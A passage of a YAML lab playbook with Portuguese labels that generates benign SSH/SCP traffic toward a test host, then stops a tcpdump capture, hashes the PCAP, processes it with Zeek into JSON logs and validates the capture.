        timeout "$SCP_TMO" scp -i "{ssh_key_path}" \
          -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
          "{scp_src_file}" "{ssh_user}@${VICTIM_IP}":"{scp_dst_dir}" >/dev/null 2>&1 || true
        jitter_ms
      }

      # prepara arquivo pequeno (uma vez)
      echo "hello benign traffic $(date +%s)" > "{scp_src_file}"

      # Execução conforme parâmetros
      run_many "$SSH_N" do_ssh
      run_many "$SCP_N" do_scp

  - id: sensor_capture_stop
    title: "Sensor | Parar captura e calcular hash"
    description: "Encerra tmux/tcpdump, calcula sha256 e registra no log."
    host: sensor
    tags: ["sensor","capture"]
    eta: "<3s"
    timeout: 40
    artifacts:
      - "{cap_dir}/cap_${TS}.pcap"
      - "{cap_dir}/cap_${TS}.pcap.sha256"
      - "{log_dir}/capture_${TS}.log"
    script: |
      set -Eeuo pipefail
      [ -f {cap_dir}/.last_ts ] && TS=$(cat {cap_dir}/.last_ts) || TS=$(date +%Y%m%d_%H%M%S)
      sess="cap_${TS}"
      tmux has-session -t "$sess" 2>/dev/null && tmux kill-session -t "$sess" || pkill -f "tcpdump -i" || true
      sleep 1
      if [ -f "{cap_dir}/cap_${TS}.pcap" ]; then
        sha256sum "{cap_dir}/cap_${TS}.pcap" | awk '{print $1}' > "{cap_dir}/cap_${TS}.pcap.sha256"
        echo "[capture] sha256: $(cat {cap_dir}/cap_${TS}.pcap.sha256)" >> "{log_dir}/capture_${TS}.log"
      else
        echo "[capture] pcap ausente para TS=$TS" | tee -a "{log_dir}/capture_${TS}.log"
      fi

  - id: sensor_zeek_from_pcap
    title: "Sensor | Zeek no PCAP (JSON)"
    description: "Processa o PCAP com Zeek e gera conn.log/ssh.log em JSON para ETL."
    host: sensor
    tags: [ "sensor","zeek","etl" ]
    timeout: 60
    eta: "<5s"
    artifacts:
      - "{cap_dir}/zeek_out_${TS}/conn.log"
      - "{cap_dir}/zeek_out_${TS}/ssh.log"
      - "{log_dir}/capture_${TS}.log"
    script: |
      set -Eeuo pipefail
      [ -f {cap_dir}/.last_ts ] && TS=$(cat {cap_dir}/.last_ts) || TS=$(date +%Y%m%d_%H%M%S)
      ZOUT="{cap_dir}/zeek_out_${TS}"
      mkdir -p "$ZOUT"
      zeek -r "{cap_dir}/cap_${TS}.pcap" || true
      for f in conn.log ssh.log dns.log weird.log notice.log packet_filter.log capture_loss.log stats.log; do
        [ -f "$f" ] && mv "$f" "$ZOUT/" || true
      done

  - id: sensor_validate_pcap
    title: "Sensor | Validar PCAP"
    description: "Checa tamanho, quantidade de pacotes e imprime amostra."
    host: sensor
    tags: ["sensor","validate"]
    eta: "<3s"
    timeout: 20
    artifacts:
      - "{cap_dir}/cap_${TS}.pcap"
      - "{log_dir}/capture_${TS}.log"
    script: |
      set -Eeuo pipefail
      [ -f {cap_dir}/.last_ts ] && TS=$(cat {cap_dir}/.last_ts) || TS=$(date +%Y%m%d_%H%M%S)
      PCAP="{cap_dir}/cap_${TS}.pcap"
      LOG="{log_dir}/capture_${TS}.log"
      if [ ! -s "$PCAP" ]; then
        echo "[validate] PCAP ausente ou vazio: $PCAP"; exit 1
      fi
      echo "[validate] Validando $PCAP"
      PKTS=$(tcpdump -r "$PCAP" -nn 2>/dev/null | wc -l | tr -d ' ')
      echo "[validate] packets=$PKTS file=$(ls -lh "$PCAP" | awk '{print $5}')" | tee -a "$LOG"
      tcpdump -r "$PCAP" -nn -c 5 2>/dev/null | tee -a "$LOG"

